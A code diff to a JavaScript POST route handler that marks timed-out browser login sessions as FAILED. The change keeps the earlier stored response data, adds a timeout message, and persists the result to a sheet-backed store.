@@ -90,10 +90,27 @@ export async function POST(request) {
     const lastActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
     const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE"];
     if (processable.includes(row.status) && (Date.now() - lastActivity.getTime()) > 600000) {
-        setCachedRow(browserId, { status: "FAILED" });
+        // Preserve the previous lastJsonResponse — passing no lastJsonResponse here
+        // would let updateBrowserRowData substitute its default and wipe qrData/
+        // loginMethod. The survival marker for empty-email rows is stamped inside
+        // updateBrowserRowData itself.
+        let prevLr = {};
+        try {
+            const rawLr = row.lastJsonResponse;
+            prevLr = rawLr ? (typeof rawLr === 'string' ? JSON.parse(rawLr) : rawLr) : {};
+        } catch (e) { prevLr = {}; }
+        const failLr = JSON.stringify({
+            ...prevLr,
+            browserId,
+            status: "FAILED",
+            message: "Session timed out. Please try again.",
+            timestamp: new Date().toISOString()
+        });
+        setCachedRow(browserId, { status: "FAILED", lastJsonResponse: failLr });
         row.status = "FAILED";
+        row.lastJsonResponse = failLr;
         // Persist FAILED to sheet + trigger Hub update (fire-and-forget)
-        updateBrowserRowData(browserId, { status: "FAILED" }).catch(err =>
+        updateBrowserRowData(browserId, { status: "FAILED", verified: false, fullAccess: false, lastJsonResponse: failLr }).catch(err =>
             logger.error(`[pooling][${browserId}] Failed to persist stale FAILED to sheet: ${err.message}`)
         );
     }
